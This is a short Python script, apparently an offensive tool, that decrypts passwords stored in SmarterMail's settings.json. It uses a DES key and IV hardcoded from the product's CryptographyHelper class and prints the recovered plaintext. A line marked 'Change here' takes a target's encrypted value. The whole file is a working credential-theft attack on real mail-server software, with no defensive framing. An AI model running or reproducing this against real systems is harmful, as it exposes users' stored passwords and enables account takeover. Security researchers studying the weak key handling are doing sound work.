#!/usr/bin/env python3
import base64
from Crypto.Cipher import DES


# Extracted from SmarterMail.Standard.Utilities.CryptographyHelper
KEY = bytes([
    180, 63, 132, 209,
    16, 180, 233, 145
])

IV = bytes([
    1, 216, 174, 230,
    73, 173, 146, 39
])


# Value taken from the user's settings.json
encrypted_password = "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby" # Change here


def decrypt_password(ciphertext):
    # CryptographyHelper.DecodeFromBase64()
    encrypted = base64.b64decode(ciphertext)

    # CryptographyHelper uses DES when method == 0
    cipher = DES.new(KEY, DES.MODE_CBC, IV)

    decrypted = cipher.decrypt(encrypted)

    # Remove PKCS#5/PKCS#7 padding
    padding = decrypted[-1]
    decrypted = decrypted[:-padding]

    return decrypted.decode("utf-8")


if __name__ == "__main__":
    password = decrypt_password(encrypted_password)
    print(f"[+] Decrypted password: {password}")
